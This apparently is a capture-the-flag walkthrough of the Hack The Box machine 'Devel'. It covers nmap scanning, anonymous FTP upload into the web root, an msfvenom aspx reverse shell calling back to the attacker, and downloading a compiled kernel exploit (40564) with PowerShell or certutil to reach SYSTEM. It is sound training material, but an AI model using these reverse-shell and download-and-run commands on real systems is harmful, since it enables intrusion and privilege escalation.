# Devel

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled.png)

# Reconnaissance

### Running Quick initial Nmap Scan

```ruby
sudo nmap -sC -sV -O -oN nmap/initial 10.10.10.5
```

> **-sC** : Scan with nmap’s default script
**-sV** : Service detection
**-O** : OS detection
> 

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%201.png)

### Running the full scan

To make sure we’ve covered all the ports.

```python
sudo nmap -sC -sV -O -p- -oN nmap/full 10.10.10.5
```

- -p- : scan all the ports

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%202.png)

We’ve got the same Result

### Running udp scan

```python
sudo nmap -sU -O -oN nmap/udp 10.10.10.5
```

- -sU : udp scan

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%203.png)

Nothing found.

## Attack vectors

- [ ]  21 - ftp — anonymous login allowed
- [ ]  80 - running http server.

# Enumeration

Let’s have a peak in port 80, which is default webpage

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%204.png)

Now have look in ftp. As it allowed anonymous login we can easily log in by these default creds

```python
user : anonymous
pass :
```

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%205.png)

If you try accessing these file from web you can do that. May be the FTP server is in the same root as the HTTP server. lets test it, 

- upload a file via ftp
- access that file in the web

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%206.png)

FTP commands:

> - **put filename** : will upload local file to target ftp server
- ls : show the directory
> 

Accessing the file in web.

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%207.png)

we can access. So we also can execute arbitrary payload by uploading via ftp.

# Gaining Foothold

**Making a reverse shell via msfvenom**

```python

msfvenom -p windows/reverse_tcp LHOST=10.10.16.70 LPORT=9999 -f aspx -o payload.aspx
```

- **-p** : payload type.
- **-LHOST** : my local host where the server will contact
- **-LPORT** : the port on which it will connect
- **-f** : payload type. as our target server is windows we used `aspx` extension
- **-o** : output location and file name

Uploading the `payload.aspx`

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%208.png)

Starting a listener on port 9999

```python
nc -lnvp 9999
```

Executing the payload by accessing that file in the web

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%209.png)

And we get the shell.

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2010.png)

Okay, First thing first lets try to access the user flag . 

`cd c:\users` 

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2011.png)

Trying to access `babis` 

`cd babis`

permission denied  …

Administrator is also the same

Let's have basic enumeration throughout the machine.

`systeminfo` :

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2012.png)

- It's windows 7 enterprise
- Build 7600 ( quite old , should have vulnerabilities)
- Its running on `32 bit`
- And no `hotfix` available.

**Turning on Hackers Mind:**

So let's search for exploit

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2013.png)

And yeah it has an exploit. Let's follow the first link. It's a kernel exploit .

It's exploit db. To copy the exploit we just need the `EBD-ID` 

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2014.png)

It has instructions too , it will be a great help.

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2015.png)

Before doing that you should update your local searchsploit database

`searchsploit -u`

Search for the payload using searchsploit

`searchsploit 40564`

Copying/mirroring the payload in current folder

`searchsploit -m 40564`

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2016.png)

Now, read the payloads and its usage.

According to the instructions we need to compile the payload first according to the machine we are attacking. 

We are attacking the `32 bit` machine.

To download the compiler use the following commnd

```python
sudo apt-get install gcc-mingw-w64
```

Now compile the payload `40564.c` to `exploit.exe` by using following command.

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2017.png)

## Payload delivery

First Run an http server in our attacker machine. Which will create a server and will make our current directory accessible from internet. And our current directory will contain the payload.

```python
python3 -m http.server 1337
```

- 1337 is our port in which our server is running.

Now find our local ip.

```python
ipconfig 
```

`tun0` should be our local ip

***Process 1: via powershell***

```python
powershell -c "(new-object System.Net.WebClient).DownloadFile('[http://10.10.16.70:1337/exploit.exe](http://10.10.16.70:1337/exploit.exe)', 'c:\Users\Public\Downloads\exploit.exe')"
```

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2018.png)

or

***Process 2: Via `certutil`. It's the most convenient way***

```python
certutil.exe -urlcache -split -f http://10.10.16.70:1337/exploit.exe
```

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2019.png)

Sending payload to the victim machine is successful.

Now negative to that specific folder where the payload is uploaded. And simply run the exploit.

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2020.png)

And that's it. We Became `root` .

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2021.png)

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2022.png)

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2023.png)

![Untitled](Devel%20475faba49a5e4772a1bf5e671961e420/Untitled%2024.png)
